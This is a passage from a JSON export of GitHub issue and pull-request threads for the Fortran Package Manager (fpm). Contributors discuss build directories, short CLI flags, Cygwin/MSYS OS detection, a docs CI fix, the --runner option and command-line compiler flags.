            "date": "2020-11-19 03:05:43+00:00",
            "title": "Alternate directory specifications",
            "text": "There are reasons to be able to specify build directories other than the defaults for building and for searching for dependencies.\nTo reduce duplication and the need to pull dependencies remotely I would suggest that you be able to specify a directory to buil dependencies in via an environment variable, and that you be able to specify a list of directories colon-separated to seach for existing dependencies somewhat like LD_LIBRARY. The ability to specify an alternate build directory that is a full pathname has some security risks if you allow externally created scripts to be used to do the build, but that is a general issue with any blindly trusted script.\nIt would also be useful to add additional directory names in the fpm.toml file to be automatically searched. Personally, in addition to applications and tests I often have demos/examples and program for testing performance. If I decide to place these outside of app/ and /test I then have to list them individually in fpm.toml; but it is very undesirable to have them run if I use \"fpm run\" or \"fpm test\" automatically.\nA third case is for the --flags option. It would be good to be able to specify a directory for a build when using --flags, and that --flags NOT be allowed to build the default and --release builds; and that that directory name (assumed to only be allowed to be a simple name that follows the rules of a Fortran variable name, not a full path name) could then be used with the run and test subcommands to use those executables. So you could do something like fpm build -flag -p -dir profile and then fpm run -dir profile.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-19 13:58:20+00:00",
                    "text": "There are reasons to be able to specify build directories other than the defaults for building and for searching for dependencies.\n\nThis is a known weakness of the packaging model of cargo which partly inspired the current fpm behaviour. Cargo has an option to do exactly this kind of thing, reusing dependencies between projects. From my observation this feature was always heavily discouraged because of potential incompatibilities and security risks.\nSharing dependencies between projects will just cost us a lot of work to implement and a lot of pain to maintain and debug. A more sustainable model would certainly be necessary for this purpose.\nI think the main issue is rooted in the static linking approach fpm (and cargo as well) are using. An easy way to fix it is to compile shared objects and link dynamically. The drawback of this approach is that we have to start caring about ABI compatibility between dependency versions as well.\n\nIt would also be useful to add additional directory names in the fpm.toml file to be automatically searched. Personally, in addition to applications and tests I often have demos/examples and program for testing performance. If I decide to place these outside of app/ and /test I then have to list them individually in fpm.toml; but it is very undesirable to have them run if I use \"fpm run\" or \"fpm test\" automatically.\n\nIt could be worth to add [[example]] or [[benchmark]] to the package specification for this purpose. But maybe it is easier to add this property to the existing [[test]] and [[executable]] tables:\n[[test]]\nbenchmark = true\n\n[[executable]]\nexample = true"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-20 03:14:17+00:00",
                    "text": "There might be dependencies specific to the benchmarks or examples that makes me lean towards you first syntax. I was picturing being able to add directory names to be automatically built where the names could be an arbitrary user-supplied list but at least personally my use cases are for those two categories. So would the names be configurable or specifically be \"benchmark\" and \"example\"?\nI am actually a fan of static loading for almost all cases except for \"device interface\" libraries like for MPI and X11; so I would live with the status-quo. I was already concerned with some of the issues a shared directory might present but I think most of them are no worse that what you currently get with shared libraries .\nIf a central repository could only be used with commit keys specified (although that sort of impies the use of git(1) versus some other CVS systems), somwhat like the -r parameter often available on loaders I was thinking most of the problems in such a scheme would be avoided and the alternative could be a large number of copies of dependencies that would be burdensome to update. I think there are a lot of pros to such an approach.\nI was looking for something discussing the cargo issues and whether it was a deprecated cargo feature and a quick search did not find anything. Anything you could refer me to? I already knew there were pros and cons but not being a rust/cargo user I think it would be enlighting. The cargo package seems to be a good model from some references I see that seem to mention it as a better model than other languages have."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-20 07:17:53+00:00",
                    "text": "There is the CARGO_TARGET_DIR environment variable: https://doc.rust-lang.org/cargo/reference/config.html#buildtarget-dir\nIt was suggested recently for usage in the AUR for speeding up packaging, but not well received: https://lists.archlinux.org/pipermail/aur-general/2020-September/035922.html"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-20 14:11:09+00:00",
                    "text": "My biggest use case would be for QA of a large package used by many other fpm packages, especially if the dependency required special build options different than the other parts of the package. After seeing some of the issues raised I guess just installing the dependencies once verified as \"regular\" libraries outside of fpm and then using them with something like the h-fpm --link option would handle that case, but then the package is not fully contained within fpm. So it depends on how I want packages \"installed\" on a machine and the use of external links instead of package dependencies. Pros and cons on both sides of that for me. So I guess this is too early a consideration and for now it seems far clearer if everything is self-contained in the build/ directory I guess; and there is a work-around in that packages can be extracted from fpm and used like any other library.  Picturing a larger project I do not want to have to rebuild something equivalent to X11 Windows or MPI or OpenMP or other large complex libraries for every little program I build that might use them. I could easily picture an fpm packaging of netlib, for example.  So I'm convinced this is not something to do now and can be reconsidered if fpm is successful enough that it is an issue later when things like \"installing\" an fpm package become better defined."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-20 14:44:54+00:00",
                    "text": "I would recommend to look into other build systems.\nWe had gone through a painful porting process for a CMake based project recently, to allow dynamically linking against projects that were previously repackaged and statically linked. The overall process was not pleasant at all and let to a lot of boilerplate CMake code.\nI made better experiences with meson regarding dependencies so far, the meson-wrap tool allows to define subprojects (quite similar in the way fpm handles dependencies right now) as fallbacks if the dependency is not found on the host system. This works nicely for me, since I usually use the fallback for local development and still have the possibility to create separate packages for distribution.\nSuch a dependency / fallback system could be implemented by a local fpm-registry."
                }
            ]
        },
        {
            "number": 243,
            "user": "urbanjost",
            "date": "2020-11-19 02:20:51+00:00",
            "title": "Suggest including short arguments for the major long subcommand options [fortran fpm]",
            "text": "Currently the syntax of f-fpm subcommands sans --help and\n--version consists of the following:\n    build [--release] [--list] [--flag COMPILER_OPTIONS]\n    help [NAME(s)]\n    new NAME [--lib|--src] [--app] [--test] [--backfill]\n    list [--list]\n    run [NAME(s)] [--release] [--runner \"CMD\"] [--list] [-- ARGS]\n    test [NAME(s)] [--release] [--runner \"CMD\"] [--list] [-- ARGS]\n\nSuggest allowing short names as well as long names at least for\nthe most commonly interactively used options, as in\n    build [--release|-r] [--list|-l] [--flag|-f COMPILER_OPTIONS]\n    help [NAME(s)]\n    new NAME [--lib|-l|--src|-s] [--app|-a] [--test|-t] [--backfill|-b]\n    list [--list|-l]\n    run [NAME(s)] [--release|-r] [--runner|-c \"CMD\"] [--list|-l] [-- ARGS]\n    test [NAME(s)] [--release|-r] [--runner|-c \"CMD\"] [--list|-l] [-- ARGS]\n\nThat is,\n   --app, `-a`\n   --backfill, `-b`\n   --help, `-h`\n   --lib, `-l`\n   --list, `-l `\n   --release, `-r`\n   --runner, `-c`\n   --src, `-s`\n   --test, `-t`\n   --version, `-v`\n\nLooking at cargo it allows short names for several options, but not all.\nSome commands like stack appear to only allow a few short options, like\n-j and -v. Some commands like git allow a lot of short options. In git's case it is only\nfor the more common options on each subcommand; but  note git(1) has an elaborate aliasing\nscheme that allows users to make aliases; including an internal scripting\nlanguage.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-19 13:48:43+00:00",
                    "text": "Adding short flags should be done sparsely, while it might be convenient we only got a limited amount of them. I would favour a more careful design of the command line arguments in the first place, arguments that are expected to be used frequently should be easier/shorter to type."
                }
            ]
        },
        {
            "number": 242,
            "user": "urbanjost",
            "date": "2020-11-17 00:02:04+00:00",
            "title": "OS detection is faulty",
            "text": "Running in a CygWin environment I had to unset the environment variable OS which was set for the MSWIndows applications and inherited by the CygWin application in order for the routine testing for system type to identify the environment as a CygWin/POSIX environment instead of a default MSWindows environment. Looks like the routine automatically assumes if the OS variable is set it is MSWindows.   At least need a note to that effect somewhere; but might want to change the test. Specifically for CygWin there are several environment variables and the /usr/bin/cyg* commands that can be tested for without having to call platform-specific C routines if anyone wants a list. The routine identifying the platform is slated for replacement by a stdlib routine I believe, but that might be a ways off.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-17 13:36:53+00:00",
                    "text": "The Windows check (using 'OS'):\n\n  \n    \n      fpm/fpm/src/fpm_environment.f90\n    \n    \n        Lines 36 to 39\n      in\n      c68cf2f\n    \n    \n    \n    \n\n        \n          \n           if (rc == 0 .and. length > 0 .and. index(val, 'Windows_NT') > 0) then \n        \n\n        \n          \n               r = OS_WINDOWS \n        \n\n        \n          \n               return \n        \n\n        \n          \n           end if \n        \n    \n  \n\n\noccurs before the cygwin check (using 'OSTYPE'):\n\n  \n    \n      fpm/fpm/src/fpm_environment.f90\n    \n    \n        Lines 64 to 67\n      in\n      c68cf2f\n    \n    \n    \n    \n\n        \n          \n           if (index(val, 'cygwin') > 0) then \n        \n\n        \n          \n               r = OS_CYGWIN \n        \n\n        \n          \n               return \n        \n\n        \n          \n           end if \n        \n    \n  \n\n\nbut since cygwin imports all Windows environment variables, the Windows check will take precedence over the cygwin one and always return OS_WINDOWS.\nA possible fix could be to check the environment variable 'OS' after 'OSTYPE' and not before - what do you think @interkosmos?"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-17 13:40:42+00:00",
                    "text": "I just checked: Cygwin defines OSTYPE (to be \"cygwin\") whereas plain\nWindows does not define it - instead it uses OS. So the logic should take\nthat non-existence into account. But checking OSTYPE first seems a\nreasonable solution.\n\nOp di 17 nov. 2020 om 14:37 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n The Windows check (using 'OS'):\n\n https://github.com/fortran-lang/fpm/blob/c68cf2fbdb40c33636bd50b6a729490ae9d61654/fpm/src/fpm_environment.f90#L36-L39\n\n occurs before the cygwin check (using 'OSTYPE'):\n\n https://github.com/fortran-lang/fpm/blob/c68cf2fbdb40c33636bd50b6a729490ae9d61654/fpm/src/fpm_environment.f90#L64-L67\n\n but since cygwin imports all Windows environment variables\n <https://cygwin.com/cygwin-ug-net/setup-env.html>, the Windows check will\n take precedence over the cygwin one and always return OS_WINDOWS.\n\n A possible fix could be to check the environment variable 'OS' after\n 'OSTYPE' and not before - what do you think @interkosmos\n <https://github.com/interkosmos>?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#242 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR2ALYVCXMPTJ4X7QX3SQJ4AJANCNFSM4TX3JB5A>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-17 13:44:23+00:00",
                    "text": "Hm, MinGW poses another complication: if started as mingw64.exe you have a\nLinux-like environment under Windows that is compatible with plain Windows,\nwhereas msys64.exe takes you closer to Linux. The two environment variables\ndo not allow you to distinguish the two, though I think mingw64.exe is the\npreferred environment\n\nOp di 17 nov. 2020 om 14:40 schreef Arjen Markus <arjen.markus895@gmail.com\n\u2026\n:\n I just checked: Cygwin defines OSTYPE (to be \"cygwin\") whereas plain\n Windows does not define it - instead it uses OS. So the logic should take\n that non-existence into account. But checking OSTYPE first seems a\n reasonable solution.\n\n Op di 17 nov. 2020 om 14:37 schreef Laurence Kedward <\n ***@***.***>:\n\n> The Windows check (using 'OS'):\n>\n> https://github.com/fortran-lang/fpm/blob/c68cf2fbdb40c33636bd50b6a729490ae9d61654/fpm/src/fpm_environment.f90#L36-L39\n>\n> occurs before the cygwin check (using 'OSTYPE'):\n>\n> https://github.com/fortran-lang/fpm/blob/c68cf2fbdb40c33636bd50b6a729490ae9d61654/fpm/src/fpm_environment.f90#L64-L67\n>\n> but since cygwin imports all Windows environment variables\n> <https://cygwin.com/cygwin-ug-net/setup-env.html>, the Windows check\n> will take precedence over the cygwin one and always return OS_WINDOWS.\n>\n> A possible fix could be to check the environment variable 'OS' after\n> 'OSTYPE' and not before - what do you think @interkosmos\n> <https://github.com/interkosmos>?\n>\n> \u2014\n> You are receiving this because you are subscribed to this thread.\n> Reply to this email directly, view it on GitHub\n> <#242 (comment)>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AAN6YR2ALYVCXMPTJ4X7QX3SQJ4AJANCNFSM4TX3JB5A>\n> .\n>"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-17 14:00:46+00:00",
                    "text": "Yes I agree with you @arjenmarkus. To distinguish between the mingw64.exe shell and the msys64.exe shell there should be an 'MSYSTEM' environment variable set to 'MINGW64' and 'MSYS' for the two different shells respectively.\n\nAside: as an example why the two shells should be treated differently, execute_command_line will call the msys bash shell in msys64.exe but call the Windows cmd shell in mingw64.exe. Hence msys should be treated like Linux and mingw64 like Windows."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-30 12:19:23+00:00",
                    "text": "I had a look at running fpm under MSYS2 and realised there's another problem with the OS detection routine. The routine looks for the OSTYPE environment variable, however OSTYPE is a bash variable and not a common environment variable. Hence the current implementation is actually unable to identify OS_WINDOWS, OS_CYGWIN, or OS_SOLARIS."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-30 22:42:05+00:00",
                    "text": "Yes, noticed that too but you can do an \"export OSTYPE\"  and \"unset OS\" as a work-around in your .bashrc as a work-around for Cygwin. If fpm is to support some form of pre-processing OSTYPE in one form or another would be a useful one to have set as well.  Not sure if there is a stdlib routine to do this in the works. perhaps a work-around is to assume fpm is compiled with GNU and to add a C routine that looks for gnu_linux and linux and similar variables instead of re-creating something for now.  A lot more predefined variables exist for gcc than gfortran for some reason. The main reason I think the code is looking for what OS it is it to determine a file separator character, which I think I have a routine for that just uses INQUIRE and a few other things on the pathname returned for ARG0 to figure out the seperator character as another alternative.\ncpp -dM /dev/null"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-31 10:15:26+00:00",
                    "text": "I agree it would be good for fpm to define some preprocessor variables such as OSTYPE, it's frustrating that many useful variables defined in cpp are excluded from gfortran for no good reason.\nHowever, for fpm we need to detect OSTYPE at runtime due to complications with the various possible Windows systems; in particular, 'plain Windows' binaries (currently supported) can run on msys2/cygwin but run into issues with our filesystem routines implemented via shell commands.\n\nThe main reason I think the code is looking for what OS it is it to determine a file separator character\n\nYes, also to add the .exe suffix on Windows and to determine which shell command to execute for our filesystem routines (to be replaced).\nActually determining which shell command to run at the moment is the main problem on msys2/cygwin, once these routines are replaced with c calls, we should then only need to distinguish *nix from Windows at runtime."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-31 19:33:44+00:00",
                    "text": "In\nhttps://github.com/urbanjost/M_io\nI have two routines (which(3f) and separator(3f)) which might be useful, but I have not tested them in several of those environments. The separator procedure tries to use standard Fortran and an INQUIRE on arg0 to determine if a backslash is\nbeing used or a slash as a separator, which(3f) tries to use the PATH environment variable to see if a command is in the current path. Otherwise, maybe bundling a little C program and executing like a system command (and assuming gfortran and GNU cpp) would work well."
                }
            ]
        },
        {
            "number": 241,
            "user": "14NGiestas",
            "date": "2020-11-16 22:52:33+00:00",
            "title": "Fix docs CI failing #240",
            "text": "I didn't found any set-env command in the JamesIves repo (It is all typescript), so maybe bumping the version fixes the issue.\nEDIT: yep that was it.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-17 08:53:34+00:00",
                    "text": "This is a small change to fix a problem, so I will merge."
                }
            ]
        },
        {
            "number": 240,
            "user": "everythingfunctional",
            "date": "2020-11-16 18:13:57+00:00",
            "title": "Doc Workflow Fails",
            "text": "The doc workflow introduced in #237 appears not to be working. @awvwgk , any chance you can take a closer look and find out what went wrong? You can find the workflow that failed here.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-11-16 21:29:28+00:00",
                    "text": "Same with stdlib API docs."
                },
                {
                    "user": "14NGiestas",
                    "date": "2020-11-16 22:31:42+00:00",
                    "text": "The fpm workflow uses this one JamesIves/github-pages-deploy-action, funny thing I have to fix it there."
                },
                {
                    "user": "14NGiestas",
                    "date": "2020-11-16 23:02:30+00:00",
                    "text": "I just bumped the version to the latest one and it seemed to work, can someone please verify if it fixes the issue?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-17 09:01:41+00:00",
                    "text": "Closed with #241"
                }
            ]
        },
        {
            "number": 239,
            "user": "urbanjost",
            "date": "2020-11-15 17:44:48+00:00",
            "title": "Add --runner option to Fortran fpm to match Haskell fpm",
            "text": "This option already exists in the Haskell version. It helps reduce the need\nfor the user to interact directly with the build/ directory, which ideally\nshould be a black box as far as the user is concerned.\n --runner CMD   A command to prefix the program execution paths with.\n            For use with utilities like valgrind(1), time(1), and\n            other utilities that launch executables; commands that\n            inspect the files like ldd(1), file(1), and ls(1); and\n            that copy or change the files like strip(1) and install(1).\n\nEXAMPLES\n  # install executables in directory (assuming install(1) exists)\n  fpm run -c 'install -b -m 0711 -p -t /usr/local/bin'",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-17 19:40:36+00:00",
                    "text": "M_CLI2 is basically one call to define command and crack command line and then two different ways to query the option values. It looks different because the names are in the form  --LONGNAME:SHORTNAME. Otherwise it is used by essentially typing the command as you would use it except that all values must be specified and that logicals must be given a value of F or T and strings must be double-quoted.  The short names are not listed in the documentation yet so if no one wants short names I will remove them; but you should be able to enter:\nfpm new A -la \nfpm run -c 'gdbg'\nfpm -l\nRight now to see them you can use the --usage|-u switch\nfpm new --usage"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-18 09:23:43+00:00",
                    "text": "Thanks for explaining, the command line code is making sense to me now. I don't mind introducing short names, though it might be better to use a separate PR for them so they can be discussed."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-19 01:33:58+00:00",
                    "text": "Removed short argument names. Will create a new PR for that discussion"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-20 08:52:59+00:00",
                    "text": "Was waiting to see if anyone complained about --runner just providing a simple prefix syntax.\n\nFunnily enough I did require this capability to copy the executable file elsewhere; but because the command is constructed simply as a concatenated shell string, I simply passed the remaining postfix arguments as ARGS after --.\ne.g.\n$ fpm run --runner cp -- /path/to/destination/\nWhile not the intended syntax, I started conceptualising -- as the executable substitution. Though obviously one must be careful which arguments go before and after -- for the intended behaviour."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-20 14:52:17+00:00",
                    "text": "Huh.  \"Every capability becomes a feature whether intended or not\". Clever thought. Did not even occur to me there is already a \"prefix\" filename \"suffix\" syntax there.   I was picturing something like  fpm run -runner 'cp %FNAME /path/to/destination' of course.  Trying to think of any reason not to show your \"feature\" as an example.  If --runner is excepted I was thinking it deserves a separate \"help\" page, where the test/run help would say \"see fpm help runner for further information\" and could show using it with gdb, install, some_non-GNU-command, ... .  that had me thinking about the pros and cons of the help text being built into the fpm program itself, but I think for now that is OK."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-20 15:02:24+00:00",
                    "text": "@LKedward , that is exactly what I had in mind when I added the --runner option. I'm pretty sure mentioned as much in one of my comments some where. Glad to know I'm not the only one who noticed it. ;)"
                }
            ]
        },
        {
            "number": 238,
            "user": "urbanjost",
            "date": "2020-11-15 16:57:56+00:00",
            "title": "Add --runner command to Fortran fpm to match bootstrap fpm",
            "text": "Add the --runner switch to the run and test subcommands on f-fpm. This was recently added to the h-fpm command. It allows for more intuitive use of a command prefix than\nfpm run --list|xargs -iXX  cmd XX ###INTEROGATE\nparticularly since xargs(1) probably is only available on GNU/Linux, Cygwin, and Unix platforms.\nCommon use cases for fpm run|test --runner \"COMMAND\" include using the following commands:\nCommon GNU/Linux and Unix commands\n\nnm         - list symbols from object files\nsize       - list section sizes and total size.\nldd        - print shared object dependencies\nls         - list directory contents\nstat       - display file or file system status\nfile       - determine file type\n\nPERFORMANCE\n\nvalgrind   - a suite of tools for debugging and profiling programs\ntime       - time a simple command or give resource usage\ntimeout    - run a command with a time limit\n\nCOPY\n\ninstall    - copy files and set attributes\ntar        - an archiving utility\n\nALTER\n\nrm         - remove files or directories\nchmod      - change permissions of a file\n\n  fpm run -c  'install -b -m 0711 -p -t /usr/local/bin'\n  fpm run --runner \"tar cvfz $HOME/bundle.tgz\"\n  fpm run --runner ldd\n  fpm run --runner strip",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-15 18:01:12+00:00",
                    "text": "Added pull request #239 as a proposed implementation. The --runner CMD  command is used simply as a prefix.  Was considering that if the cmd include the strings %NAME and %BNAME that it would do a substitute for those strings using the name and basename of the name respectively to allow for commands where the filename does not appear at the end, but for consistency unless a strong use case is made for such a feature I chose to just use it as a prefix for consistency between the versions."
                }
            ]
        },
        {
            "number": 237,
            "user": "awvwgk",
            "date": "2020-11-10 21:52:01+00:00",
            "title": "Add workflow to build and deploy documentation",
            "text": "Adds a workflow to build and deploy the fpm documentation (based on workflow I use in toml-f):\n\nbuild documentation with ford (branch and PR)\ndeploy on master to branch gh-pages branch in same repository\n\nTODO\n\nmight require somebody with owner rights to add API-tokens",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-11-11 19:29:26+00:00",
                    "text": "Great, thank you! Once this is in, where will the docs be available? fortran-lang.github.io/fpm?\nShould we set up a fpm.fortran-lang.org subdomain like we have for stdlib.fortran-lang.org?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-14 16:48:20+00:00",
                    "text": "Should now be visible at https://fortran-lang.github.io/fpm, probably needs a bit of more content. Migration to https://fpm.fortran-lang.org is still required."
                }
            ]
        },
        {
            "number": 236,
            "user": "rouson",
            "date": "2020-11-10 04:10:34+00:00",
            "title": "fix(install): remove additional bashisms",
            "text": "This pull request makes the edits suggested at\nhttps://github.com/fortran-lang/fpm/pull/216#pullrequestreview-518403499",
            "comments": []
        },
        {
            "number": 235,
            "user": "urbanjost",
            "date": "2020-11-09 20:41:50+00:00",
            "title": "[Fortran fpm]  Add support for command-line specification of compiler options",
            "text": "The h-fpm version allows compiler options on the command line. I would propose allowing the same capability but using the\nsyntax\nfpm build [NAME(S)] [-release] -- ARGS\nwhere ARGS could be multiple compiler options.\n\nAny feedback on use cases for the feature, and comments on the h-fpm option would be informative as to whether this option should be added or not.\nshould the options replace all the options sans the ones required for the build (ie. -J, -I, ...) or be in addition to the default options?\nI think the documentation should indicate that this potentially breaks a package being self-describing, as it would be problematic to have required options on external dependencies. It  would be useful for building a top-level package with different options.  Options for profiling come to mind, as well as external system libraries. Other options are being discussed to handle the compile and load options as something provided in the manifest file but there will probably always be a case for supplying various options while developing a package.\nThe h-fpm version hashes the options to create a unique pathname for each combination of switches. That is an option here ; as well as requiring a user-supplied name ;or still being built in the standard location. Not sure what the general sentiment is about that.  Using the hash resolves all kinds of collision problems but could be hard to remember and duplicate unless the hash is reversible and tagged with a name for reuse.\nshould the options only apply to an application and not external dependencies and files in src/? Should there be an option to control what it applies to?  Would a rebuild of all package components be required?\nshould the syntax be the same in both the f-fpm and h-fpm packages or is it an advantage to allow for two syntaxes (and underlying implementation differences) for exploring more possibilities?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-09 21:04:41+00:00",
                    "text": "Just a note, if you tie the build directory to the compiler options, as I've done for h-fpm, then you have to pass the same options to fpm run, or it will (re)build and run a different version.\nI don't know that the CLI for h-fpm and f-fpm must be identical. I think a little bit of experimentation in this area can help us find a more optimal solution. Ideally they should be similar and converge to the same, but don't have to be identical initially."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-12 07:31:39+00:00",
                    "text": "We were discussing using another command for this over at #220. There is cargo-rustc for Rust, which essentially allows to build using the syntax you proposed. A similar command for fpm could be fpm-compile.\nTo solve the issue with the arguments for the other build modes, fpm-compile could allow to build and run targets just like the fpm-run and fpm-test:\nfpm compile [--run|--test target] [--compiler name] [-- [args]...]\n\nIn contrast fpm-build would require a defined profile in the package manifest."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-12 15:19:17+00:00",
                    "text": "I like it, but it's missing two aspects.\n\nSpecifying the runner (like #221)\nSpecifying the target arguments\n\nFor 1, I would just add the --runner argument. For 2, I think using the [-- [args]] for that, and then adding a --flags argument that takes a string with all the flags might be the better way to go. In fact, I may switch to that for #220 (or a future PR, I haven't decided)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-19 03:23:02+00:00",
                    "text": "I have a version ready that currently assumes\n#238 and #243 are implemented. It would be trivial to remove\nthe dependencies but it logically follows #238 and the Haskell\nversion of --flag; and becomes much cleaner if the --dir option\ndiscussed in #244 (but not implemented in my current implementation)\nis accepted.\nThe version I have ready just applies the options to the debug version\nunless --release is specified in which case it applies to the release\nversion. I do not consider that ideal but it is useful and allows for\nbuilds that would otherwise require the support of options in the fpm.toml\nfile or custom build scripts, such as allowing for X11 libraries or other\nexternal libraries.\nLean towards there being two options, one for compiles and one for\nloads but for now matching the current proposal to some extent (but that\nautomatically builds in an alternate directory) seems needed."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 09:31:31+00:00",
                    "text": "lternate compilers. This is an alpha version for furthering discussion\non how to implement these features as discussed here so I do not think\nit is appropriate yet for an actual pull request, but I would like some\ntrials and feedback on the interface. The code itself might need some\nrefactoring depending on how that goes. So, if interested\nThere are three new switches\n   --build_name NAME, -B          has to be Fortran name\n   --compiler COMPILER_NAME, -C   has to be Fortran name\n   --flags ARGUMENTS, -F\n\nEssentially, if you use --compiler and/or --flags you have to specify a\nbuild name with the --build_name NAME switch.\nThe names release and debug are reserved.\nYou can only specify the custom build flags on the \"build\" subcommand.\nYou then use the --compiler and --build_name on \"run\" and \"test\" to match\nthe build.\nSo this is just a single file you have to build with gfortran:\n   # get the single-file build file\n   wget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90\n   # compile and name \"ffpm\" somewhere in your path\n   gfortran ffpm.f90 -o $HOME/.local/bin/ffpm\nget an fpm project. For example\n```bash\ngit clone https://github.com/urbanjost/M_CLI2\n\ncd M_CLI2\n\n# assuming `ffpm` is in your path from above:\n\n# build the package with the name \"ONE\" with the nvfortran compiler:\nffpm build --compiler nvfortran --flags '-Mbackslash' --build_name ONE\n\n# build it again with the ifort compiler:\nffpm build --compiler ifort\n\n# build it again normally\nffpm build\n\n# and again as a release version\nffpm build --release\n\n# build with gfortran but with no user-specified compiler switches\nffpm build  --build_name DEFAULT\n# to run that\nffpm run --build_name DEFAULT\n\n# profile with gfortran\nffpm build --build_name PROFILE --flags '-pg'\nffpm run   --build_name PROFILE\nffpm run   --build_name PROFILE  --runner gprof\n\n# build with ifort(1) compiler and profiling options\nffpm build --compiler ifort --build_name PROFILE --flags '-p'     # build\nffpm run   --compiler ifort --build_name PROFILE                  # run\nffpm run   --compiler ifort --build_name PROFILE  --runner gprof  # profile\nIdeally I would like to see this functionality available via the TOML file as discussed in other issues but this gives  a working model for getting an idea of what some of the issues will be.  RIght now for compilers other than gfortran it is assuming the modules are placed in the directory specified via -module DIRNAME which is an issue that needs a more generic solution.  Hopefully this will further the discussion a bit more and help lead to a real pull request."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 16:17:12+00:00",
                    "text": "So after trying a lot of variants,  I think:\nThere are two special build suffix names (assuming the compiler name is the prefix) that are used as build directories that are reserved. They can only be used if the compiler is supported and take no user-supplied link options.  They are only allowed if the compiler is supported.  The one is debug, which is the default. The other is release, which is used if you do a --release.\nThere is a compiler switch --compiler whose default is set with the environment variable FPM_COMPILER else it is gfortran.\nIf you supply any user-specified compiler options with --flags you must use the build command to build and you must specify a user-supplied build name via --build_name.  You can then use --compiler and --build_name with a matching name on the run and test commands to run executables built with those options.  On build options after -- can be options equivalent to --flags or maybe should be \"loader only\" options.  If your compiler name is not known and the switch for specifying where  output files to be placed is not \"-module $NAME\"   then you must supply and environment variable called FPM_BUILD_OUTPUT which has a space placed between it and the build directory name unless it ends in an = in which case the filename is appended directory to it.\nSo current usage  would be unchanged.\nsetting FPM_COMPILER to a supported compiler name would work just like the default except put files in build/${COMPILER}_debug/ and _release.  Or, on build, run, and test you could add --compiler $FPM_COMPILER.  If you want to specify your own compiler switches (assuming  internally used option names are \"universal\" like -o, which is generally but not completely true) you can add a -flags option and a build name.  This ignores specifying anything in the TOML file which I support.  These switches (--compiler --build_name --flags,  -- ARGS) and environment variables would be marked as provisional and documented completely only in \"fpm help compiler\" with a  prominent note saying they are intended primarily to handle build requirements not yet internalized in fpm and are subject to change. The names are so long I think short names are appropriate, all capitalized to emphasize they are provisional (--compiler,-C; --build_name,-B, --flags,-F).  If no strong opinions not to after waiting for this week I will put in a pull request for a prototype that meets that description after a week that should follow PR #239."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 16:39:48+00:00",
                    "text": "There is a compiler switch --compiler whose default is set with the environment variable FPM_COMPILER else it is gfortran.\n\nI would suggest to stay as consistent with other build systems. The established default for the compiler environment variable is FC across several build systems and meta build systems.\n\nIf your compiler name is not known and the switch for specifying where output files to be placed is not \"-module $NAME\" then you must supply and environment variable called FPM_BUILD_OUTPUT which has a space placed between it and the build directory name unless it ends in an = in which case the filename is appended directory to it.\n\nThe environment variable FPM_BUILD_OUTPUT doesn't capture this purpose in my opinion. I have seen get_module_outdir_args in the meson implementation of the Fortran compiler. CMake uses Fortran_MODULE_DIRECTORY to set the directory path in the build file. From the name FPM_BUILD_OUTPUT I wouldn't expect to set the module output directory for the Fortran compiler.\n\nThe names are so long I think short names are appropriate, all capitalized to emphasize they are provisional (--compiler,-C; --build_name,-B, --flags,-F).\n\n-C is expected in many build systems (make, ninja, meson, ...) and other programs as well (git, ...) to switch the directory, I would discourage using this short flag for the compiler. -B is the CMake flag to select the build directory output, so this might work as expected. I wonder if we should prefer underscores or hyphens in flags? Or might there a better synonym for build name we could use here instead?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 17:25:40+00:00",
